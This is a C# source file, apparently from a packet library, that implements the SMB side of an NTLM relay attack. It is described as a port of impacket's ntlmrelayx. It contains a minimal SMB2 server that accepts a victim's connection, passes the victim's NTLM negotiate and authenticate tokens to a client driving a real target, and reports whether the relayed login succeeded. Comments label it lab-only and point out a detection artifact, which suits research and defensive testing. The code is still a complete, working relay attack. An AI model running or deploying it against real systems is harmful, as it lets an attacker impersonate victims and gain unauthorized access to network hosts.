using System.Net;
using System.Net.Sockets;
using DotNetPacket.Core;
using DotNetPacket.Protocols.Ntlm;
using DotNetPacket.Transport;

namespace DotNetPacket.Protocols.Smb;

/// <summary>What happened on one relayed victim connection — enough to report and to diff on the wire.</summary>
public sealed class Smb2RelayOutcome
{
    public required string VictimEndpoint { get; init; }

    /// <summary>The NTLM CHALLENGE the target produced and the relay handed back to the victim.</summary>
    public required byte[] RelayedChallenge { get; init; }

    /// <summary>The victim's NTLM AUTHENTICATE (Type 3), computed against the relayed challenge.</summary>
    public required byte[] VictimAuthenticate { get; init; }

    /// <summary>The target's NT status for the relayed AUTHENTICATE (SUCCESS = relay authenticated).</summary>
    public required uint TargetStatus { get; init; }

    public bool Relayed => TargetStatus == NtStatus.Success;
}

/// <summary>
/// The SMB side of ntlmrelayx: a minimal SMB2 server that accepts a victim connection, carries the
/// NTLM SPNEGO handshake, and hands each NTLM token to a relay callback that drives a client against
/// the real target. Port of the handshake in impacket's
/// <c>examples/ntlmrelayx/servers/smbrelayserver.py</c> (the SMB2 NEGOTIATE / SESSION_SETUP hooks).
///
/// LAB-ONLY. It downgrades to SMB 2.1 so the server side carries no 3.1.1 preauth/signing state (the
/// relay never holds the session key — that is the point). The detection-relevant artifact is that the
/// challenge it returns to the victim is the <em>target's</em> challenge: the same NTLM server
/// challenge then appears in two TCP sessions at once.
/// </summary>
public sealed class Smb2RelayServer : IDisposable
{
    private const uint FlagsServerToRedir = 0x00000001;
    private static readonly byte[] ServerGuid = Guid.NewGuid().ToByteArray();

    private readonly TcpListener _listener;

    public Smb2RelayServer(int port, IPAddress? bind = null)
    {
        _listener = new TcpListener(bind ?? IPAddress.Loopback, port);
    }

    public void Start() => _listener.Start();

    public int Port => ((IPEndPoint)_listener.LocalEndpoint).Port;

    /// <summary>
    /// Accepts one victim connection and relays its NTLM authentication through
    /// <paramref name="relay"/>, which receives the victim's Type 1 and must return the target's
    /// Type 2 (challenge), then receives the victim's Type 3 (+ optional mechListMIC) and must return
    /// the target's NT status. Returns once the handshake completes.
    /// </summary>
    public Smb2RelayOutcome AcceptAndRelay(IRelayTarget relay)
    {
        using TcpClient client = _listener.AcceptTcpClient();
        string victim = client.Client.RemoteEndPoint?.ToString() ?? "?";
        DirectTcpTransport transport = DirectTcpTransport.FromAccepted(client);

        // 1) NEGOTIATE: answer with SMB 2.1 and an SPNEGO hint advertising NTLMSSP.
        byte[] negReq = transport.ReceiveMessage();
        var negHeader = new Smb2Header();
        negHeader.Unpack(negReq);
        transport.SendMessage(BuildNegotiateResponse(negHeader.MessageId));

        // 2) SESSION_SETUP #1: the victim's Type 1 -> relay to target -> target's Type 2 (challenge).
        byte[] ss1 = transport.ReceiveMessage();
        var ss1Header = new Smb2Header();
        ss1Header.Unpack(ss1);
        byte[] victimType1 = Spnego.ExtractInitialToken(Smb2SessionSetupRequest.ParseSecurityBuffer(ss1));

        byte[] targetChallenge = relay.Negotiate(victimType1);
        const ulong relaySessionId = 0x4152_4C45_5941_4258; // "RELAYABX"-ish, lab marker
        transport.SendMessage(BuildSessionSetupResponse(
            ss1Header.MessageId, relaySessionId, NtStatus.MoreProcessingRequired, Spnego.WrapChallenge(targetChallenge)));

        // 3) SESSION_SETUP #2: the victim's Type 3 (+ MIC) -> relay to target -> target's status.
        byte[] ss2 = transport.ReceiveMessage();
        var ss2Header = new Smb2Header();
        ss2Header.Unpack(ss2);
        (byte[] victimType3, byte[]? mic) = Spnego.ExtractResponseTokenWithMic(Smb2SessionSetupRequest.ParseSecurityBuffer(ss2));

        uint targetStatus = relay.Authenticate(victimType3, mic);
        transport.SendMessage(BuildSessionSetupResponse(
            ss2Header.MessageId, relaySessionId, targetStatus,
            targetStatus == NtStatus.Success ? Spnego.WrapAcceptCompleted() : Array.Empty<byte>()));

        return new Smb2RelayOutcome
        {
            VictimEndpoint = victim,
            RelayedChallenge = targetChallenge,
            VictimAuthenticate = victimType3,
            TargetStatus = targetStatus,
        };
    }

    private static byte[] BuildNegotiateResponse(ulong messageId)
    {
        byte[] spnego = Spnego.WrapServerNegotiateHint();
        var header = ServerHeader((ushort)Smb2Command.Negotiate, messageId, NtStatus.Success, sessionId: 0);

        var body = new ByteWriter(ByteOrder.Little);
        body.WriteUInt16(65);                               // StructureSize
        body.WriteUInt16(1);                                // SecurityMode = SIGNING_ENABLED
        body.WriteUInt16((ushort)Smb2Dialect.Smb210);       // DialectRevision 2.1
        body.WriteUInt16(0);                                // NegotiateContextCount
        body.WriteBytes(ServerGuid);                        // ServerGuid (16)
        body.WriteUInt32(0);                                // Capabilities
        body.WriteUInt32(0x00800000);                       // MaxTransactSize
        body.WriteUInt32(0x00800000);                       // MaxReadSize
        body.WriteUInt32(0x00800000);                       // MaxWriteSize
        body.WriteUInt64((ulong)DateTime.UtcNow.ToFileTimeUtc()); // SystemTime
        body.WriteUInt64(0);                                // ServerStartTime
        body.WriteUInt16((ushort)(Smb2Header.Size + 64));   // SecurityBufferOffset (header + 64-byte fixed body)
        body.WriteUInt16((ushort)spnego.Length);            // SecurityBufferLength
        body.WriteUInt32(0);                                // NegotiateContextOffset
        body.WriteBytes(spnego);

        return Assemble(header, body.ToArray());
    }

    private static byte[] BuildSessionSetupResponse(ulong messageId, ulong sessionId, uint status, byte[] spnego)
    {
        var header = ServerHeader((ushort)Smb2Command.SessionSetup, messageId, status, sessionId);

        var body = new ByteWriter(ByteOrder.Little);
        body.WriteUInt16(9);                                // StructureSize
        body.WriteUInt16(0);                                // SessionFlags
        body.WriteUInt16((ushort)(Smb2Header.Size + 8));    // SecurityBufferOffset (header + 8-byte fixed body)
        body.WriteUInt16((ushort)spnego.Length);            // SecurityBufferLength
        body.WriteBytes(spnego);

        return Assemble(header, body.ToArray());
    }

    private static Smb2Header ServerHeader(ushort command, ulong messageId, uint status, ulong sessionId) => new()
    {
        Command = command,
        MessageId = messageId,
        Status = status,
        Flags = FlagsServerToRedir,
        CreditRequest = 1,
        SessionId = sessionId,
    };

    private static byte[] Assemble(Smb2Header header, byte[] body)
    {
        var writer = new ByteWriter(ByteOrder.Little);
        writer.WriteBytes(header.Pack());
        writer.WriteBytes(body);
        return writer.ToArray();
    }

    public void Dispose() => _listener.Stop();
}

/// <summary>Relays to an SMB target: drives an <see cref="Smb2Client"/> against it with the victim's tokens.</summary>
public sealed class Smb2RelayClientTarget : IRelayTarget, IDisposable
{
    private readonly Smb2Client _client = new();

    public Smb2RelayClientTarget(string targetHost, int port = 445)
    {
        _client.Connect(targetHost, port);
        _client.Negotiate();
    }

    public Smb2Client Client => _client;

    public byte[] Negotiate(byte[] victimType1) => _client.RelayChallenge(victimType1);

    public uint Authenticate(byte[] victimType3, byte[]? mechListMic) => _client.RelayAuthenticate(victimType3, mechListMic);

    public void Dispose() => _client.Dispose();
}
